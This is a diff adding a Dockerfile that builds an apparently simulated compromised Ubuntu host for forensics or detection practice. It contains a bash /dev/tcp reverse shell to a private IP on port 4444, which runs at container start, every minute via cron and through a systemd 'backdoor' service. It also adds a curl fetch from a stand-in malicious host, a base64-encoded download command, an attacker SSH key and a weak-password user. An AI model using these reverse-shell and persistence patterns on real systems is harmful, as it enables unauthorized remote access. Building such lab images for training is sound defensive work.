@@ -1,0 +1,44 @@
+docker-file
+
+FROM ubuntu:20.04
+
+RUN apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
+    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
+    mkdir -p /home/attacker && chown attacker:attacker /home/attacker
+
+# Create fake malware script
+RUN echo '#!/bin/bash' > /home/attacker/malware.sh && \
+    echo 'echo "Stealing data..."' >> /home/attacker/malware.sh && \
+    echo 'curl http://malicious.example.com/payload.sh' >> /home/attacker/malware.sh && \
+    chmod +x /home/attacker/malware.sh
+
+# Create reverse shell script (edit IP)
+RUN echo '#!/bin/bash' > /home/attacker/revshell.sh && \
+    echo 'bash -i >& /dev/tcp/192.168.44.129/4444 0>&1' >> /home/attacker/revshell.sh && \
+    chmod +x /home/attacker/revshell.sh
+
+# Simulated bash history
+RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/.bash_history
+
+# Add cron persistence
+RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && \
+    chmod 600 /var/spool/cron/crontabs/attacker
+
+# Add systemd service (simulated persistence)
+RUN mkdir -p /etc/systemd/system && \
+    echo "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+
+# SSH backdoor
+RUN mkdir -p /home/attacker/.ssh && \
+    echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
+    chmod 600 /home/attacker/.ssh/authorized_keys && \
+    chown -R attacker:attacker /home/attacker/.ssh
+
+# Encoded payload
+RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64
+
+WORKDIR /home/attacker
+USER attacker
+
+CMD ["/home/attacker/revshell.sh"]
